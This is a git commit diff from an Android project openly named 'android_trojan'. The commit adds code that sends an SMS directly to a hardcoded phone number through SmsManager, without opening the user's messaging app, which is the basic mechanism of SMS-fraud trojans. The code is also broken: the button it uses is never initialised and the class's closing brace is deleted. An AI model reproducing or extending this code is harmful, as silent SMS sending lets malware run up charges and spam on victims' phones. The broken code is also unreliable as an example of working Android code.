fa2e996e0b36b368996b3fd18dc46e56c6cdd43b
Jean-Laurent <toto@toto.fr>
2014-11-26 15:57:49 +0100

    26/11 - 12h35

--- app/src/main/java/trojan/android/android_trojan/first_activity.java
+++ app/src/main/java/trojan/android/android_trojan/first_activity.java
@@ -1,27 +1,39 @@
 package trojan.android.android_trojan;
 
 import android.app.Activity;
-import android.content.Intent;
-import android.net.Uri;
+import android.content.Context;
 import android.os.Bundle;
+import android.provider.Telephony;
+import android.telephony.SmsManager;
+import android.view.View;
+import android.widget.Button;
 
 /**
  * Created by Jean-Laurent on 26/11/2014.
  */
 public class first_activity extends Activity {
+    private static final String TAG = "first_activity";
+    Context context;
+    private Button button01;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.first_activity);
-        /*
-        Intent sms = new Intent(Intent.ACTION_SENDTO,
-                Uri.parse("smsto:0628470850");
-                sms.putExtra("sms_body", "Test Message !");
-                startActivity(sms);
-        )
-        */
+
+        button01.setOnClickListener(new View.OnClickListener() {
+           @Override
+          public void onClick(View v) {
+                SmsManager();
+            }
+        });
 
     }
-}
+
+
+    static void SmsManager() {
+        SmsManager manager = SmsManager.getDefault();
+        manager .sendTextMessage("0628470850", null, "Test Message 1 !", null, null);
+    }
+
 
